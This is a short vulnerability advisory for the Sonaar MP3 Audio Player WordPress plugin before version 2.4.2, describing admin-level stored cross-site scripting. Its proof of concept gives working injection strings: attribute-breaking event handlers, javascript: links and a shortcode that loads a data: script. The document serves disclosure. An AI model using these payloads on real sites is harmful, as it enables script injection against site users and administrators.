## WordPress Plugin Vulnerabilities

# MP3 Audio Player for Music, Radio & Podcast by Sonaar < 2.4.2 - Multiple Admin+ Cross Site Scripting

### Description

The plugin does not properly sanitize or escape data in some of its Playlist settings, allowing high privilege users to perform Cross-Site Scripting attacks

### Proof of Concept

1) Add playlist with "Optional Call to Action"'s "Label" set to:
" style="animation-name:twentytwentyone-close-button-transition" onanimationend="alert(origin)//
2) Set "Optional Call to Action" and "External Links Button"'s "Link URL" to:
javascript:alert(origin)
3) Post this shortcode:
[sonaar\_audioplayer play-latest="a" scrollbar='" style="animation-name:twentytwentyone-close-button-transition" onanimationend="alert(1+origin)//' playlist\_title='" style="animation-name:twentytwentyone-close-button-transition" onanimationstart="alert(2+origin)//' titletag\_playlist='script src="data:text/javascript,alert(3+origin)" ']
